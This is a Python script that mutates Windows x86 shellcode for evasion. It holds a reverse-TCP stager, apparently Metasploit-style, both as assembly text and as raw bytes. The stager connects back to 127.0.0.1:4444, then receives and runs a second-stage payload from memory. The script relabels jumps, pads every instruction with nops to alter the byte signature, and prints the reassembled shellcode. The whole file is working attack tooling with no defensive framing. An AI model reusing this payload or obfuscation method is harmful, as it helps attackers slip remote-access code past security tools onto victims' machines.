from capstone import *
import ctypes
from keystone import *
import struct

controlflow=["jmp","jz","jnz","je","jne","call","jl","ja","loop","jecxz","jle","jge","jg","jp","jnl"]
registers=["eax","ebx","edx","ebp","esp","edi","esi"]
asm="cld ;call 0x88;pushal ;mov ebp, esp;xor eax, eax;mov edx, dword ptr fs:[eax + 0x30];mov edx, dword ptr [edx + 0xc];mov edx, dword ptr [edx + 0x14];mov esi, dword ptr [edx + 0x28];movzx ecx, word ptr [edx + 0x26];xor edi, edi;lodsb al, byte ptr [esi];cmp al, 0x61;jl 0x25;sub al, 0x20;ror edi, 0xd;add edi, eax;loop 0x1e;push edx;push edi;mov edx, dword ptr [edx + 0x10];mov ecx, dword ptr [edx + 0x3c];mov ecx, dword ptr [ecx + edx + 0x78];jecxz 0x82;add ecx, edx;push ecx;mov ebx, dword ptr [ecx + 0x20];add ebx, edx;mov ecx, dword ptr [ecx + 0x18];jecxz 0x81;dec ecx;mov esi, dword ptr [ebx + ecx*4];add esi, edx;xor edi, edi;lodsb al, byte ptr [esi];ror edi, 0xd;add edi, eax;cmp al, ah;jne 0x4f;add edi, dword ptr [ebp - 8];cmp edi, dword ptr [ebp + 0x24];jne 0x45;pop eax;mov ebx, dword ptr [eax + 0x24];add ebx, edx;mov cx, word ptr [ebx + ecx*2];mov ebx, dword ptr [eax + 0x1c];add ebx, edx;mov eax, dword ptr [ebx + ecx*4];add eax, edx;mov dword ptr [esp + 0x24], eax;pop ebx;pop ebx;popal ;pop ecx;pop edx;push ecx;jmp eax;pop edi;pop edi;pop edx;mov edx, dword ptr [edx];jmp 0x15;pop ebp;push 0x3233;push 0x5f327377;push esp;push 0x726774c;mov eax, ebp;call eax;mov eax, 0x190;sub esp, eax;push esp;push eax;push 0x6b8029;call ebp;push 0xa;push 0x100007f;push 0x5c110002;mov esi, esp;push eax;push eax;push eax;push eax;inc eax;push eax;inc eax;push eax;push 0xe0df0fea;call ebp;xchg eax, edi;push 0x10;push esi;push edi;push 0x6174a599;call ebp;test eax, eax;je 0xe4;dec dword ptr [esi + 8];jne 0xcb;call 0x14b;push 0;push 4;push esi;push edi;push 0x5fc8d902;call ebp;cmp eax, 0;jle 0x12c;mov esi, dword ptr [esi];push 0x40;push 0x1000;push esi;push 0;push 0xe553a458;call ebp;xchg eax, ebx;push ebx;push 0;push esi;push ebx;push edi;push 0x5fc8d902;call ebp;cmp eax, 0;jge 0x144;pop eax;push 0x4000;push 0;push eax;push 0x300f2f0b;call ebp;push edi;push 0x614d6e75;call ebp;pop esi;pop esi;dec dword ptr [esp];jne 0xaf;jmp 0xdf;add ebx, eax;sub esi, eax;jne 0x10b;ret ;mov ebx, 0x56a2b5f0;push 0;push ebx;call ebp"
asmarray=asm.split(";")
length=len(asmarray)

def assemble(code):
	try:
		ks = Ks(KS_ARCH_X86, KS_MODE_32)
		encoding, count = ks.asm(code)
		return [hex(i) for i in encoding]
	except KsError as e:
		print(e)
		return -1

CODE = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

def byteoffset2index(offset):
	temp=offset
	a=0
	for i in md.disasm(CODE, 0x0):
		temp-=len(i.bytes)
		a+=1
		if temp==0:
			return a
if __name__ == "__main__":
	md = Cs(CS_ARCH_X86, CS_MODE_32)
	tags=[]
	for i in range(0,len(asmarray)):
		for mnemonic in controlflow:
			if (mnemonic in asmarray[i]):
				tags.append(i)
	mask=[]
	for i in range(0,len(tags)):
		for reg in registers:
			if (reg in asmarray[tags[i]]):
				mask.append(tags[i])
	[tags.remove(i) for i in mask]
	tagins=[asmarray[i]  for i in tags]
	revision=[]
	for i in range(0,len(tagins)):
		b=tagins[i][tagins[i].index("0x"):]
		n=byteoffset2index(int(b,16))
		revision.append(n)
	revision_unique=list(set(revision))
	for i in range(0,len(revision_unique)):
		asmarray[revision_unique[i]]="a"+str(revision_unique[i])+": "+asmarray[revision_unique[i]]
	tagins=[asmarray[i]  for i in tags]
	for i in range(0,len(tags)):
		asmarray[tags[i]]=tagins[i][:tagins[i].index("0x")]+"a"+str(revision[i])
	obfuscation="nop"
	code=obfuscation+";"+(";"+obfuscation+";").join(asmarray)
	print("\\x"+"\\x".join([("00000"+i.lstrip("0x"))[-2:] for i in assemble(code)]))